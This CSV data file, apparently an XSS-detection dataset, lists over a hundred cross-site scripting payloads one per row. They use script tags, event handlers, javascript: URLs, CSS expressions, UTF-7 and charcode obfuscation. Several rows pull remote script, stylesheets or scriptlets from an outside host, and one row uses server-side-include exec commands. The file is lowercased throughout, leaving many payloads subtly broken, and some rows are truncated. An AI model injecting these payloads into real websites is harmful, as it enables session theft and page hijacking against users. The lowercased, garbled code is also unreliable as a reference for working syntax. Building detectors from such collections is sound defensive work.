,Sentence
412,"<table id=xss background=""javascript:alert('xss')"">"
413,"<table id=xss><td background=""javascript:alert('xss')"">"
414,"<div id=xss style=""background-image: url(javascript:alert('xss'))"">"
415,"<div id=xss style=""width: expression(alert('xss'));"">"
416,"<iframe id=xss src=""javascript:alert('xss');""></iframe>"
417,"<frameset><frame id=xss src=""javascript:alert('xss');""></frameset>"
418,"<table background=""javascript:alert('xss')"">"
419,"<table><td background=""javascript:alert('xss')"">"""
420,"<style>@im\\port'\\ja asc ipt:alert(""xss"")';</style>"
421,"<img id=xss style=""xss:expr/*xss*/ession(alert('xss'))"">"
422,"<style type=""text/javascript"">alert('xss');</style>"
423,"<style>.xss{background-image:url(""javascript:alert('xss')"");}</style><a class=xss></a>"
424,"<style type=""text/css"">body{background:url(""javascript:alert('xss')"")}</style>"
425,"<base href=""javascript:alert('xss');//"">"
426,<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>
427,"a=""get"";b=""url("""";c=""javascript:"";d=""alert('xss');"")"";eval(a+b+c+d);"
428,"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>"
429,"<xml id=""xss""><i><b><img id=xss src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span dataid=xss src=""#xss"" datafld=""b"" dataformatas=""html""></span>"
430,"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>"
431,"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert(""xss"")</script>""></body></html>"
432,"<? echo('<scr)';echo('ipt>alert(""xss"")</script>'); ?>"
433,"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('xss')</script>"">"
434,<script id=xss src=http://127.0.0.1></script>
435,"//--></script>"">'><script>alert(string.fromcharcode(88,83,83))</script>"
436,"<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>"
437,"<img id=xss src=""&14;javascript:alert('xss');"">"
438,"<script <b>=alert('xss');""></script>"
439,"<iframe id=xss src=""javascript:alert('xss'); <"
440,<script>a=/xss/nalert('xss');</script>
441,"<style>li {list-style-image: url(""javascript:alert('xss');</style><ul><li>xss"
442,"<div style=""background-image: url(javascript:alert('xss'));"">"
443,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""></head>+adw-script+ad4-alert('xss');+adw-/script+ad4-"
444,"<a href=""javascript#alert('xss');"">"
445,"<div onmouseover=""alert('xss');"">,"
446,"<input type=""image"" dynid=xss src=""javascript:alert('xss');"">"
447,"&<script>alert('xss');</script>"">"
448,<img id=xss src=&{alert('xss');};>
449,"<a id=xss href=""about:<script>alert('xss');</script>"">"
450,"<div id=xss style=""binding: url(javascript:alert('xss'));"">"
451,"<object classid=clsid:..."" codebase=""javascript:alert('xss');"">"
452,<style><!--</style><script>alert('xss');//--></script>
453,![cdata[<!--]]<script>alert('xss');//--></script>
454,<!-- -- --><script>alert('xss');</script><!-- -- -->
455,"<img id=xss src=""blah""onmouseover=""alert('xss');"">"
456,"<img id=xss src=""blah>""onmouseover=""alert('xss');"">"
457,"<xml id=""x""><a><b><script>alert('xss');</script>;<b></a></xml>"
458,"<div datafld=""b"" dataformatas=""html"" dataid=xss src=""#xss""></div>"
459,[a][a]script>alert('xss');[a][a]/script>
460,"<xml id=i><x><c><![cdata[<img id=xss src=""javas]]<![cdata[cript:alert('xss');"">]]</c><x></xml>"
461,"<form id=""test"" /><button form=""test"" formaction=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">x"
462,"<input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
463,"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
464,"<textarea id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
465,"<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
466,"<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>"
467,"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//"
468,"<body id=xss onscroll=eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>"
469,"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">"
470,"<video onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))""><source>"
471,<iframe id=xss / /onload=alert(/xss/)></iframe>
472,"<iframe id=xss / ""onload=alert(/xss/)></iframe>"
473,<iframe id=xss///////onload=alert(/xss/)></iframe>
474,"<iframe id=xss ""onload=alert(/xss/)></iframe>"
475,<iframe id=xss <?php echo chr(11)?> onload=alert(/xss/)></iframe>
476,<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>
477,""" onfocus=alert(xss) ""> <"""
478,""" onblur=alert(xss) ""> <"""
479,""" onmouseover=alert(xss) "">"
480,""" onclick=alert(xss) "">"
481,"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss"
482,"</textarea>'""><script>alert(xss)</script>"
483,"'""""><script language=""javascript""> alert('x s s');</script>"
484,</script></script><<<<script><>>>><<<script>alert(xss)</script>
485,<html><noalert><noscript>(xss)</noscript><script>(xss)</script>
486,'></select><script>alert(xss)</script>
487,}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>
488,"<script>document.write(""xss"");</script>"
489,"a=""get"";b=""url"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);"
490,"='><script>alert(""xss"")</script>"
491,"<body background=javascript:'""><script>alert(xss)</script>></body>"
492,"data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4="
493,<script>alert('xss');</script>
494,<script id=xss src=http://ha.ckers.org/xss.js></script>
495,"<img id=xss src=`javascript:alert(""rsnake says, 'xss'"")`>"
496,id=xss src= <img 6;avascript:alert('xss')>
497,"<script/xss id=xss src=""http://ha.ckers.org/xss.js""></script>"
498,<script id=xss src=http://ha.ckers.org/xss.js?<b>
499,"<img id=xss src=""javascript:alert('xss')"""
500,<script>a=/xss/
501,"<img dynid=xss src=""javascript:alert('xss')"">"
502,"<img lowid=xss src=""javascript:alert('xss')"">"
503,"<br size=""&{alert('xss')}"">"
504,"<layer id=xss src=""http://ha.ckers.org/scriptlet.html""></layer>"
505,"<link rel=""stylesheet"" href=""http://ha.ckers.org/xss.css"">"
506,<style>@import'http://ha.ckers.org/xss.css';</style>
507,"<meta http-equiv=""link"" content=""<http://ha.ckers.org/xss.css>; rel=stylesheet"">"
508,"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>"
509,"<img id=xss src=""mocha:[code]"">"
510,"<img id=xss src=""livescript:[code]"">"
511,"<meta http-equiv=""link"" content=""<javascript:alert('xss')>; rel=stylesheet"">"
512,"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('xss');"">"
513,"<div style=""background-image: url(javascript:alert('xss'))"">"
514,"<div style=""width: expression(alert('xss'));"">"
515,"<img style=""xss:expr/*xss*/ession(alert('xss'))"">"
516,"<xss style=""xss:expression(alert('xss'))"">"
517,"exp/*<xss style='no\\xss:noxss(""*//*"");"
518,"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>"
519,"geturl(""javascript:alert('xss')"")"
520,"a=""get"";"
521,"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">"
522,"<xml id=xss src=""http://ha.ckers.org/xsstest.xml"" id=i></xml>"
523,"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>"
524,"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->"
525,<? echo('<scr)';
526,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-"
527,"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>"
528,"<script a="">"" '' id=xss src=""http://ha.ckers.org/xss.js""></script>"
529,"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>"
530,"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>"
531,"<script>document.write(""<scri"");</script>pt id=xss src=""http://ha.ckers.org/xss.js""></script>"
